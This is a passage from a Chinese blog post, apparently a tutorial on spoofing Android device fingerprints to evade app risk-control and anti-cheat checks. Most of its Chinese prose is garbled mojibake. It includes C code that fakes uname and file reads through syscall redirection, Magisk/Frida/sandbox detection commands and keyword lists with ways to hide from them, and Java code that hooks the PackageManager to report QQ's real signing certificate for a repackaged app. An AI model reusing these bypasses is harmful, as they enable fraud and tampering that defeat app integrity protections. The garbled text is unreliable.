utsname));</span><br><span class="line">    <span class="keyword">if</span> (msg_ret == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> mockLinuxRelease ;</span><br><span class="line">        getZhenxiRuntimeMMKV()-&gt;getString(LINUX_VERSION_RELEASE,mockLinuxRelease);</span><br><span class="line">        <span class="built_in">memcpy</span>(buff-&gt;release,mockLinuxRelease.c_str() ,SYS_NMLN);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> mockLinuxVersion ;</span><br><span class="line">        getZhenxiRuntimeMMKV()-&gt;getString(LINUX_VERSION_VERSION,mockLinuxVersion);</span><br><span class="line">        <span class="built_in">memcpy</span>(buff-&gt;version,mockLinuxVersion.c_str() ,SYS_NMLN);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å†™å…¥å†…å­˜</span></span><br><span class="line">        <span class="type">int</span> ret = write_data(tracee, reg, buff, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> utsname));</span><br><span class="line">        <span class="keyword">if</span>(ret!=<span class="number">0</span>)&#123;</span><br><span class="line">            LOGE(<span class="string">&quot;linux info write data error %s &quot;</span>, strerror(errno));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        LOGE(<span class="string">&quot;read_data read data error %s &quot;</span>, strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popenç›¸å…³"><a href="#popenç›¸å…³" class="headerlink" title="popenç›¸å…³"></a>popenç›¸å…³</h3><p><strong>æ³¨æ„1ï¼š</strong></p><p>å› ä¸ºpopenåº•å±‚èµ°çš„æ˜¯execveçš„è¿™ä¸ªå‘½ä»¤è¡Œï¼Œæ˜¯ä¸€ä¸ªshellå‘½ä»¤çš„å…¥å£ï¼Œåœ¨64ä½Soé‡Œé¢åªè¦å¯¹svcçš„openatè¿›è¡ŒIOé‡å®šå‘ï¼Œå“ªæ€•ä»–æ‰§è¡Œçš„æ˜¯execve ä¹Ÿå¯ä»¥è¿›è¡ŒIOé‡å®šå‘ã€‚<strong>å› ä¸º64ä½execve åº•å±‚è¯»å–æ–‡ä»¶ï¼Œèµ°çš„ä¹Ÿæ˜¯openat</strong></p><p>ä¸¾ä¸ªä¾‹å­:</p><p>å½“æˆ‘æ‰§è¡Œ<code>popen cat /sys/devices/soc0/serial_number</code>ï¼Œå¦‚æœ<code>/sys/devices/soc0/serial_number</code>è¿™ä¸ªæ–‡ä»¶è¢«svc openaté‡å®šå‘åˆ°<code>/sdcard/a</code>æ–‡ä»¶ã€‚æœ€ç»ˆ<code>cat /sys/devices/soc0/serial_number</code>è¯»å–åˆ°çš„ä¹Ÿæ˜¯<code>/sdcard/a</code> ï¼Œè€Œä¸æ˜¯åŸå§‹çš„&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number ã€‚</p><p><strong>æ³¨æ„2ï¼š</strong></p><p>popenè¿™ä¸ªå‡½æ•°å®ƒæœ¬èº«ä¼šå¼€å¯ä¸€æ¡çº¿ç¨‹å»æ‰§è¡Œshell ï¼Œå› ä¸ºexecveæœ¬èº«å°±æ˜¯å¼€ä¸€æ¡çº¿ç¨‹å»æ‰§è¡Œã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªFile å¥æŸ„ï¼Œå¦‚æœæˆ‘ç›´æ¥Hook popen ä¿®æ”¹ä»–çš„è¿”å›ç»“æœï¼Œ<strong>æŠŠè¿”å›ç»“æœæ›¿æ¢æˆæˆ‘è‡ªå·±çš„å¥æŸ„</strong>ï¼Œè¿™æ ·æ˜¯ä¸è¢«å…è®¸çš„ï¼Œå› ä¸ºLinux ç‰¹æ€§ é»˜è®¤æƒ…å†µ<strong>Açº¿ç¨‹çš„æ–‡ä»¶åˆ›å»ºçš„æ–‡ä»¶ Bçº¿ç¨‹æ— æ³•è¯»å–</strong>ï¼Œè·¨çº¿ç¨‹æ‰¾ä¸åˆ°æ–‡ä»¶å¥æŸ„fdï¼ˆè§£å†³ä¹Ÿå¾ˆç®€å•ï¼Œ<strong>å¯ä»¥å°†æ–‡ä»¶è®¾ç½®æˆç»„å†…å¯è¯»å³å¯</strong>ï¼‰</p><p><strong>é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ¡ˆå¯ä»¥ä¸ä¿®æ”¹æ–‡ä»¶æƒé™å®ç°ä¿®æ”¹è¿”å›å†…å®¹çš„Mockå‘¢ï¼Ÿ</strong></p><p>å…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠå‚æ•°ä¿®æ”¹æˆ <code>cat è¢«ä¿®æ”¹çš„è¿”å›ç»“æœè·¯å¾„å³å¯</code> ï¼Œè¿™æ ·ä»–è¯»å–åˆ°çš„å†…å®¹ä¹Ÿæ˜¯ä½ ä¿®æ”¹è¿‡ä»¥åçš„ã€‚</p><blockquote><p>æˆ–è€…ç›´æ¥å§å‚æ•°1 è®¾ç½®æˆâ€œ â€ ï¼Œè¿™æ ·ä»–è¯»å–åˆ°çš„å†…å®¹ä¸€å®šæ˜¯nullã€‚</p></blockquote><h4 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h4><p>è¿™ä¸ªå‘½ä»¤è¡Œåœ¨ä¹‹å‰ä»‹ç»è¿‡äº†ï¼Œä¸»è¦ä¸ºäº†è§£å†³&#x2F;proc&#x2F;version è¯»å–ä¸åˆ°çš„é—®é¢˜ã€‚å¯ä»¥ç›´æ¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼å»å»è·å–Linuxçš„ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p><strong>Mock:</strong></p><p>è¿™ä¸ªunameåº•å±‚èµ°çš„è¿˜æ˜¯<code>svc uname</code>å‡½æ•°ï¼Œæ‰€ä»¥ä¿®æ”¹çš„æ—¶å€™åªéœ€è¦åœ¨<strong>svcå±‚é¢ç›´æ¥ä¿®æ”¹unameå‡½æ•°è¿”å›ç»“æœ</strong>å³å¯ã€‚</p><p>å‚è€ƒ<code>native /proc/version</code> ä¿®æ”¹ã€‚</p><h4 id="getprop"><a href="#getprop" class="headerlink" title="getprop"></a>getprop</h4><p>è¿™ä¸ªæ‰§è¡Œçš„å†…å®¹è¿”å›çš„å€¼å’Œï¼Œadb shell ä»¥åæ‰§è¡Œgetprop ç»“æœæ˜¯ä¸€æ ·çš„ã€‚è¾“å‡ºçš„æ˜¯å½“å‰æ‰‹æœºå…¨éƒ¨çš„<code>Build</code>ç›¸å…³é…ç½®ã€‚</p><h5 id="Mock-7"><a href="#Mock-7" class="headerlink" title="Mock:"></a>Mock:</h5><p>Hookçš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥Hook popen æå‰ç”Ÿäº§ä¸€ä»½å·²ç»Mockå¥½çš„ ,ç”Ÿäº§çš„è¿™ä¸ªè¦å’ŒJavaå±‚Build mockçš„å€¼æ˜¯ä¸€æ ·çš„ ï¼Œç„¶åç›´æ¥æ¢æˆ<code>cat æˆä½ è‡ªå·±çš„æ–‡ä»¶å³å¯</code> ã€‚è¿™å—éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯ getprop æœ‰ä¸‰ç§æ¨¡å¼ã€‚ä»£ç å¦‚ä¸‹</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.odm.build.id</span><br><span class="line">getprop | grep dalvik</span><br><span class="line">getprop</span><br></pre></td></tr></table></figure></blockquote><p>éœ€è¦å¯¹è¿™ç§è¿‡æ»¤æ¨¡å¼è¿›è¡Œå¤„ç†ã€‚</p><h4 id="å†…æ ¸ç›¸å…³æ–‡ä»¶çš„cat"><a href="#å†…æ ¸ç›¸å…³æ–‡ä»¶çš„cat" class="headerlink" title="å†…æ ¸ç›¸å…³æ–‡ä»¶çš„cat"></a>å†…æ ¸ç›¸å…³æ–‡ä»¶çš„cat</h4><p>ä¹‹å‰åœ¨nativeå±‚è¯´çš„å†…æ ¸æ–‡ä»¶éƒ½å¯ä»¥é€šè¿‡popenå»cat ã€‚ä»£ç å¦‚ä¸‹ï¼Œä¿®æ”¹çš„è¯ç›´æ¥<code>svc openat</code> ioé‡å®šå‘å°±å¥½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = popen(&quot;cat /sys/devices/soc0/serial_number&quot;, &quot;r&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="ps-ef-ps"><a href="#ps-ef-ps" class="headerlink" title="ps -ef &amp; ps"></a>ps -ef &amp; ps</h4><p>è¿™ä¸ªæ–‡ä»¶æ˜¯æ‰«æå½“å‰è¿›ç¨‹çš„ ï¼Œå¯ä»¥ç”¨æ¥åšåè°ƒè¯•æ£€æµ‹ï¼Œæ¯”å¦‚åˆšå¯åŠ¨çš„æ—¶å€™å»è·å–ä¸€ä¸‹å½“å‰è¿›ç¨‹åˆ—è¡¨ã€‚</p><p><strong>å°±å¯ä»¥çŸ¥é“æ˜¯å¦å­˜åœ¨frida ï¼Œæˆ–è€…å½“å‰è¿›ç¨‹æ˜¯å¦è¢«ptrace  ï¼Œå› ä¸ºç”¨ptraceè°ƒè¯•çš„è¯æ˜¯éœ€è¦å¤šå¼€å¯ä¸€æ¡è°ƒè¯•çº¿ç¨‹çš„ã€‚</strong></p><h4 id="ip-aï¼ˆé‡è¦ï¼‰"><a href="#ip-aï¼ˆé‡è¦ï¼‰" class="headerlink" title="ip aï¼ˆé‡è¦ï¼‰"></a>ip aï¼ˆé‡è¦ï¼‰</h4><p>å…¶å®å°±æ˜¯<code>ip addr</code></p><p>è¿™ä¸ªä¹Ÿæ˜¯å¾ˆæ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹ï¼Œé‡Œé¢ä¼šè·å–å½“å‰æ‰‹æœºçš„ç½‘å¡ä¿¡æ¯ï¼Œ<code>whan0 wlan1 p2p0</code> è¿™äº›ä¿¡æ¯ã€‚è¿™ä¸ªåº•å±‚èµ°çš„ä¹Ÿæ˜¯<code>netlinker</code></p><p>æ‰€ä»¥åœ¨<code>netlinker</code>å±‚ç›´æ¥ä¿®æ”¹æ‹¦æˆªï¼Œä»–å“ªæ€•æ‰§è¡Œçš„å‘½ä»¤è¡Œä¹Ÿæ˜¯ç”Ÿæ•ˆçš„ ã€‚è¿”å›çš„ä¸œè¥¿å¾ˆå¤šï¼Œå¯ä»¥è‡ªå·±å°è¯•æ‰“å°ä¸€ä¸‹ã€‚å¾ˆå¤šå¤§å‚ä¹Ÿä¼šç”¨è¿™ç§æ–¹å¼å»æ‰«æä½ çš„ç½‘å¡Macåœ°å€ ã€‚</p><h4 id="ls-al-sdcard-Android-data"><a href="#ls-al-sdcard-Android-data" class="headerlink" title="ls -al &#x2F;sdcard&#x2F;Android&#x2F;data"></a>ls -al &#x2F;sdcard&#x2F;Android&#x2F;data</h4><p>æ‰«æç§æœ‰ç›®å½•ï¼Œè¿”å›ç§æœ‰ç›®å½•çš„ä¸€äº›ä¿¡æ¯ ã€‚å¯ä»¥åˆ¤æ–­å½“å‰Appæ˜¯å¦å­˜åœ¨å…¶ä»–Appç›®å½•ä¸‹ï¼Œ<strong>ä¸»è¦ç”¨äºæ£€æµ‹æ²™ç®±</strong>ã€‚</p><p>å…¶å®æ£€æµ‹æ²™ç®±è¿˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„åŠæ³•ï¼Œå°±æ˜¯æ£€æµ‹æ‰‹æœºçš„è¿›ç¨‹ä¿¡æ¯ ã€‚å¦‚æœå½“å‰Appåœ¨è‡ªå·±æ­£å¸¸æƒ…å†µå¯åŠ¨ï¼Œåªä¼šæœ‰ä¸€æ¡çº¿ç¨‹ã€‚</p><p>ä½†æ˜¯å¦‚æœæ”¾åœ¨VAæ²™ç›’å†…éƒ¨çš„è¯ï¼ŒVAæ²™ç›’æœ¬èº«ä¼šå¯åŠ¨ä¸€æ¡çº¿ç¨‹ï¼Œè‡ªå·±çš„Appæœ¬èº«ä¹Ÿä¼šå¯åŠ¨ä¸€æ¡çº¿ç¨‹ã€‚æ‰€ä»¥çº¿ç¨‹æ•°é‡å°±å¯¹ä¸ä¸Šã€‚ä¹Ÿå¯ä»¥è®¤ä¸ºä½œå¼Šã€‚ä»£ç å‚è€ƒå¦‚ä¸‹ï¼Œ<strong>ç»•è¿‡çš„è¯ä¹Ÿå¾ˆç®€å• Hook readdir å½“å‘ç°è¯»å–çš„æ˜¯è°ƒè¯•çº¿ç¨‹ç›´æ¥return nullå³å¯ ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Test::checkSandbox</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *pdr = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pdr == nullptr) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dirent *read_ptr;</span><br><span class="line">    <span class="comment">//åœ¨appå¯åŠ¨ä¹‹å‰æ£€æµ‹å½“å‰appæ‰€æœ‰çš„è¿›ç¨‹,åˆ¤æ–­æ˜¯å¦å­˜åœ¨å’Œmainä¸ä¸€æ ·çš„è¿›ç¨‹</span></span><br><span class="line">    <span class="keyword">while</span> ((read_ptr = readdir(pdr)) != nullptr) &#123;</span><br><span class="line">        <span class="type">int</span> procpid = atoi(read_ptr-&gt;d_name);</span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">&quot;find /proc/ child dir  &quot;</span> &lt;&lt; procpid;</span><br><span class="line">        <span class="comment">//æ‰“å¼€æˆåŠŸ&amp;&amp;å‘ç°ä¸€æ¡ä¸ç­‰äºä¸»è¿›ç¨‹idçš„pid</span></span><br><span class="line">        <span class="keyword">if</span> (procpid &amp;&amp; procpid != getpid()) &#123;</span><br><span class="line">            <span class="comment">//è¿™ä¸ªæ–‡ä»¶æ‰€å±ä¸»çº¿ç¨‹</span></span><br><span class="line">            LOG(ERROR) &lt;&lt; <span class="string">&quot;&gt;&gt;&gt;&gt;&gt;  FIND OTHER THREAD SANDBOX &quot;</span> &lt;&lt; procpid;</span><br><span class="line">            closedir(pdr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(pdr);</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">&quot;&gt;&gt;&gt;&gt;&gt; NOT FIND SANDBOX &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="popenæ‰«æMagisk"><a href="#popenæ‰«æMagisk" class="headerlink" title="popenæ‰«æMagisk"></a>popenæ‰«æMagisk</h4><p>è¿™äº›å‘½ä»¤éƒ½å¯ä»¥è¿›è¡Œmagiskçš„åˆ—è¡¨çš„æ‰«æï¼Œåˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦å­˜åœ¨magiskç­‰å…³é”®å­—ï¼Œéƒ½æ˜¯å¾ˆå¥½çš„åŠæ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&quot;df | grep /sbin/.magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;mount  | grep /sbin/.magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;ps | grep magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹çš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œå¦‚æœæ˜¯ps æˆ–è€… df ç›´æ¥ç”Ÿæˆä¸€ä»½ä¸å­˜åœ¨magiskå…³é”®å­—çš„æ–‡ä»¶ï¼Œï¼ˆè¿˜æœ‰ä¸€äº›ç—•è¿¹å…³é”®å­—ï¼Œæ¯”å¦‚xposed,edxp,riruè¿™äº›éƒ½æ˜¯å¸¸ç”¨çš„æ£€æµ‹å…³é”®å­—ï¼‰</p><p>moutç›´æ¥ svc IOé‡å®šå‘ç»•è¿‡å³å¯ </p><h4 id="popen-logcat"><a href="#popen-logcat" class="headerlink" title="popen logcat"></a>popen logcat</h4><p>æœ‰å¾ˆå¤šå¤§å‚ï¼Œä»–å½“å‘ç°ä½ è®¾å¤‡ä¿¡æ¯å¼‚å¸¸çš„æ—¶å€™ï¼Œä¼šç›´æ¥æ‰§è¡Œ<code>popen logcat</code>ç›´æ¥æ‰«æä½ å½“å‰æ‰‹æœºçš„æ—¥å¿—ç³»ç»Ÿ </p><p>æŠŠ<strong>å¼‚å¸¸çš„logéƒ½è¿›è¡Œä¸ŠæŠ¥</strong>ï¼Œç”¨äºçŸ³é”¤å½“å‰ç”¨æˆ·æ˜¯å¦ä½œå¼Š ã€‚æ‰€ä»¥è¿™ä¸ªä¹Ÿéœ€è¦å¤„ç† ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pfile = popen(<span class="string">&quot;/system/bin/logcat -b main -d -v threadtime -t 200 --pid å½“å‰çº¿ç¨‹pid&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), pfile)) &#123;</span><br><span class="line">    LOGE(<span class="string">&quot;logcat  -&gt; %s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="APKç­¾åï¼š"><a href="#APKç­¾åï¼š" class="headerlink" title="APKç­¾åï¼š"></a>APKç­¾åï¼š</h2><p>ç›®å‰ä¸»è¦çš„è·å–ç­¾åå°±ä¸¤ç§åŠæ³•</p><h3 id="Java-å±‚ç›´æ¥-é€šè¿‡binderå’Œ-AMS-é€šè®¯è·å–çœŸå®ç­¾åä¿¡æ¯ã€‚"><a href="#Java-å±‚ç›´æ¥-é€šè¿‡binderå’Œ-AMS-é€šè®¯è·å–çœŸå®ç­¾åä¿¡æ¯ã€‚" class="headerlink" title="Java å±‚ç›´æ¥ é€šè¿‡binderå’Œ AMS é€šè®¯è·å–çœŸå®ç­¾åä¿¡æ¯ã€‚"></a>Java å±‚ç›´æ¥ é€šè¿‡binderå’Œ AMS é€šè®¯è·å–çœŸå®ç­¾åä¿¡æ¯ã€‚</h3><p>ç›´æ¥å’ŒAMSé€šè®¯ï¼Œè·å–æœ€çœŸå®çš„ç­¾åä¿¡æ¯</p><p>è¿™ä¹ˆä¸€æ¥ä½ ä¸ç®¡ä½ Hook pmsé‡Œé¢çš„å“ªäº›æ–¹æ³•ä¹Ÿæ²¡å•¥ç”¨</p><h4 id="ç»•è¿‡åŸç†"><a href="#ç»•è¿‡åŸç†" class="headerlink" title="ç»•è¿‡åŸç†"></a>ç»•è¿‡åŸç†</h4><p>å› ä¸ºå’ŒAMSé€šè®¯éœ€è¦ç”¨åˆ°Binderï¼ŒBinderå¯ä»¥ç†è§£æˆâ€œæ°´ç®¡â€ ï¼Œä»–è™½ç„¶å’ŒAMSç›´æ¥è¿›è¡Œé€šè®¯ï¼Œä½†æ˜¯è¿˜æ˜¯è¦ç»è¿‡æˆ‘ä»¬çš„æ°´ç®¡ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹è¿™ä¸ªæ°´ç®¡å¤„ç†å³å¯ ã€‚</p><p>åœ¨é€šè®¯æ—¶å€™å¯¹æ°´ç®¡è¿›è¡Œæ‹¦æˆªã€‚åœ¨<code>BinderProxy-&gt;transact</code> çš„æ–¹æ³•é‡Œé¢è¿›è¡Œæ‹¦æˆªå’Œæ›¿æ¢ç­¾åä¿¡æ¯å³å¯</p><p>æˆ‘ä»¬ä¼šä½¿ç”¨åˆ°<code>PMS</code>ï¼Œæ¥è·å–apkçš„ç­¾åå€¼ <a href="https://www.jianshu.com/p/c559852c4878">å‚è€ƒ</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getSignature</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">            Log.i(SHARK, <span class="string">&quot;len:&quot;</span>+packageInfo.signatures.length);</span><br><span class="line">            <span class="keyword">if</span> (packageInfo.signatures != <span class="literal">null</span>) &#123;</span><br><span class="line">                Log.i(SHARK, <span class="string">&quot;sig:&quot;</span>+packageInfo.signatures[<span class="number">0</span>].toCharsString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬è¦ä½¿ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼æ›¿æ¢æ‰è¿™é‡Œçš„ä¸¤ä¸ªå±æ€§</strong></p><ul><li><strong>ActivityThreadçš„é™æ€å˜é‡sPackageManager</strong></li><li><strong>ApplicationPackageManagerå¯¹è±¡é‡Œé¢çš„mPMå˜é‡</strong></li></ul><h4 id="Hook-demp"><a href="#Hook-demp" class="headerlink" title="Hook demp"></a>Hook demp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">//ServiceManagerWraper.java</span><br><span class="line">package com.shark.hookpms;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.content.pm.PackageManager;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">public class ServiceManagerWraper &#123;</span><br><span class="line"></span><br><span class="line">    public final static String SHARK = &quot;Shark&quot;;</span><br><span class="line"></span><br><span class="line">    public static void hookPMS(Context context, String signed, String appPkgName, int hashCode) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // è·å–å…¨å±€çš„ActivityThreadå¯¹è±¡</span><br><span class="line">            Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">            Method currentActivityThreadMethod =</span><br><span class="line">                    activityThreadClass.getDeclaredMethod(&quot;currentActivityThread&quot;);</span><br><span class="line">            Object currentActivityThread = currentActivityThreadMethod.invoke(null);</span><br><span class="line">            // è·å–ActivityThreadé‡Œé¢åŸå§‹çš„sPackageManager</span><br><span class="line">            Field sPackageManagerField = activityThreadClass.getDeclaredField(&quot;sPackageManager&quot;);</span><br><span class="line">            sPackageManagerField.setAccessible(true);</span><br><span class="line">            Object sPackageManager = sPackageManagerField.get(currentActivityThread);</span><br><span class="line">            // å‡†å¤‡å¥½ä»£ç†å¯¹è±¡, ç”¨æ¥æ›¿æ¢åŸå§‹çš„å¯¹è±¡</span><br><span class="line">            Class&lt;?&gt; iPackageManagerInterface = Class.forName(&quot;android.content.pm.IPackageManager&quot;);</span><br><span class="line">            Object proxy = Proxy.newProxyInstance(</span><br><span class="line">                    iPackageManagerInterface.getClassLoader(),</span><br><span class="line">                    new Class&lt;?&gt;[]&#123;iPackageManagerInterface&#125;,</span><br><span class="line">                    new PmsHookBinderInvocationHandler(sPackageManager, signed, appPkgName, 0));</span><br><span class="line">            // 1. æ›¿æ¢æ‰ActivityThreadé‡Œé¢çš„ sPackageManager å­—æ®µ</span><br><span class="line">            sPackageManagerField.set(currentActivityThread, proxy);</span><br><span class="line">            // 2. æ›¿æ¢ ApplicationPackageManageré‡Œé¢çš„ mPMå¯¹è±¡</span><br><span class="line">            PackageManager pm = context.getPackageManager();</span><br><span class="line">            Field mPmField = pm.getClass().getDeclaredField(&quot;mPM&quot;);</span><br><span class="line">            mPmField.setAccessible(true);</span><br><span class="line">            mPmField.set(pm, proxy);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.d(SHARK, &quot;hook pms error:&quot; + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void hookPMS(Context context) &#123;</span><br><span class="line">        String qqSign = &quot;30820253308201bca00302010202044bbb0361300d06092a864886f70d0101050500306d310e300c060355040613054368696e61310f300d06035504080c06e58c97e4baac310f300d06035504070c06e58c97e4baac310f300d060355040a0c06e885bee8aeaf311b3019060355040b0c12e697a0e7babfe4b89ae58aa1e7b3bbe7bb9f310b30090603550403130251513020170d3130303430363039343831375a180f32323834303132303039343831375a306d310e300c060355040613054368696e61310f300d06035504080c06e58c97e4baac310f300d06035504070c06e58c97e4baac310f300d060355040a0c06e885bee8aeaf311b3019060355040b0c12e697a0e7babfe4b89ae58aa1e7b3bbe7bb9f310b300906035504031302515130819f300d06092a864886f70d010101050003818d0030818902818100a15e9756216f694c5915e0b529095254367c4e64faeff07ae13488d946615a58ddc31a415f717d019edc6d30b9603d3e2a7b3de0ab7e0cf52dfee39373bc472fa997027d798d59f81d525a69ecf156e885fd1e2790924386b2230cc90e3b7adc95603ddcf4c40bdc72f22db0f216a99c371d3bf89cba6578c60699e8a0d536950203010001300d06092a864886f70d01010505000381810094a9b80e80691645dd42d6611775a855f71bcd4d77cb60a8e29404035a5e00b21bcc5d4a562482126bd91b6b0e50709377ceb9ef8c2efd12cc8b16afd9a159f350bb270b14204ff065d843832720702e28b41491fbc3a205f5f2f42526d67f17614d8a974de6487b2c866efede3b4e49a0f916baa3c1336fd2ee1b1629652049&quot;;</span><br><span class="line">        hookPMS(context, qqSign, &quot;com.shark.hookpms&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">//PmsHookBinderInvocationHandler.java</span><br><span class="line">package com.shark.hookpms;</span><br><span class="line"></span><br><span class="line">import android.content.pm.PackageInfo;</span><br><span class="line">import android.content.pm.PackageManager;</span><br><span class="line">import android.content.pm.Signature;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class PmsHookBinderInvocationHandler implements InvocationHandler &#123;</span><br><span class="line">    private Object base;</span><br><span class="line"></span><br><span 